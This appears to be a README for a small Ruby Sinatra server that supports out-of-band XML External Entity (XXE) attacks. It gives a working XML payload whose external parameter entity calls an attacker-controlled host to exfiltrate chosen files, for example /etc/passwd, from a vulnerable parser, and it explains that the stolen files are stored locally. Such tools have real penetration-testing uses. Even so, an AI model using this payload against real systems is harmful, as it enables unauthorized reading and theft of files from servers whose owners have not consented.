XXE Out of Band Server. 

This tiny Sinatra app will assist you in using the XXE Out of Band technique
described in [0].

Usage:

Start on default port of 443 (may need `sudo` on some systems)

`ruby xxeserve.rb`

Pass in port to start on

`ruby xxeserve.rb 8080`

Trigger the XML parser with the following XML:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://YOURHOST:YOURPORT/xml?f=FULLPATH">
%remote;
%int;
%trick;]>
```

Where YOURHOST and YOURPORT needs to be set to the host/port this app
runs on in the URL you provide. FULLPATH needs to be set to the 
full absolute path of the to be read file (e.g. f=/etc/passwd)

e.g. http://8.8.8.8:443/xml?f=/etc/passwd

The according file will be send to the app and stored under ./files

Depending on the targeted parser it may not work with all files.

\[0\] [http://www.nosuchcon.org/talks/2013/D3_03_Alex&Timur_XML_Out_Of_Band.pdf](http://www.nosuchcon.org/talks/2013/D3_03_Alex&Timur_XML_Out_Of_Band.pdf)
